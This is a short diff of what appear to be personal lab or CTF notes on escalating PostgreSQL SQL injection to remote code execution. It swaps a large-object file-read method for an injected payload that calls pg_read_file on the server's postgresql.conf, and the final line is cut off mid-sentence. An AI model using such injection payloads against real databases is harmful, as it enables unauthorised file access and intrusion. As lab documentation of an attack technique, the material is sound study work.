@@ -268,13 +268,7 @@ https://thegrayarea.tech/postgres-sql-injection-to-rce-with-archive-command-c8ce
 So ill follow this article to try and get RCE
 
 ```python
-SELECT lo_import('/etc/postgresql/15/main/postgresql.conf')
+''; SELECT pg_read_file('/etc/postgresql/15/main/postgresql.conf');
 ```
 
-![](Pasted%20image%2020260907193512.png)
-
-This command returns the LOID, which i can use to download the file
-
-```python
-SELECT encode(lo_get(104454), 'escape')
-```
+Rather getting the LOID of the file then using that to output it, ill just use this copy the contents to my
